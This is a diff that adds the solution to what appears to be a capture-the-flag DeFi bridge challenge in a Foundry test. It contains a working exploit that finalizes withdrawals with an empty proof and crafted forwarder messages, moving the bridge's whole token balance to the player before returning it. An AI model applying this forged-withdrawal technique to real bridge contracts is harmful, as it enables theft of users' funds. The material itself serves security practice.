@@ -89,7 +89,51 @@ contract WithdrawalChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_withdrawal() public checkSolvedByPlayer {
-        
+        vm.warp(1718787127 + l1Gateway.DELAY());
+
+        bytes32[] memory proof;
+
+        bytes memory message = abi.encodeCall(l1Forwarder.forwardMessage, (
+            uint256(0),
+            0x328809Bc894f92807417D2dAD6b7C998c1aFdac6,
+            address(l1TokenBridge),
+            abi.encodeCall(l1TokenBridge.executeTokenWithdrawal, (0x328809Bc894f92807417D2dAD6b7C998c1aFdac6, 10000000000000000000))
+        ));
+        l1Gateway.finalizeWithdrawal(uint256(0), l2Handler, address(l1Forwarder), uint256(1718786915), message, proof);
+
+        message = abi.encodeCall(l1Forwarder.forwardMessage, (
+            uint256(1),
+            0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e,
+            address(l1TokenBridge),
+            abi.encodeCall(l1TokenBridge.executeTokenWithdrawal, (0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e, 10000000000000000000))
+        ));
+        l1Gateway.finalizeWithdrawal(uint256(1), l2Handler, address(l1Forwarder), uint256(1718786965), message, proof);
+
+        message = abi.encodeCall(l1Forwarder.forwardMessage, (
+            uint256(3),
+            0x671d2ba5bF3C160A568Aae17dE26B51390d6BD5b,
+            address(l1TokenBridge),
+            abi.encodeCall(l1TokenBridge.executeTokenWithdrawal, (0x671d2ba5bF3C160A568Aae17dE26B51390d6BD5b, 10000000000000000000))
+        ));
+        l1Gateway.finalizeWithdrawal(uint256(3), l2Handler, address(l1Forwarder), uint256(1718787127), message, proof);
+
+        message = abi.encodeCall(l1Forwarder.forwardMessage, (
+            uint256(2),
+            player,
+            address(l1TokenBridge),
+            abi.encodeCall(l1TokenBridge.executeTokenWithdrawal, (player, token.balanceOf(address(l1TokenBridge))))
+        ));
+        l1Gateway.finalizeWithdrawal(uint256(2), l2Handler, address(l1Forwarder), uint256(1718787050), message, proof);
+
+        message = abi.encodeCall(l1Forwarder.forwardMessage, (
+            uint256(2),
+            0xea475d60c118d7058beF4bDd9c32bA51139a74e0,
+            address(l1TokenBridge),
+            abi.encodeCall(l1TokenBridge.executeTokenWithdrawal, (0xea475d60c118d7058beF4bDd9c32bA51139a74e0, 999000000000000000000000))
+        ));
+        l1Gateway.finalizeWithdrawal(uint256(2), l2Handler, address(l1Forwarder), uint256(1718787050), message, proof);
+
+        token.transfer(address(l1TokenBridge), token.balanceOf(player));
     }
 
     /**
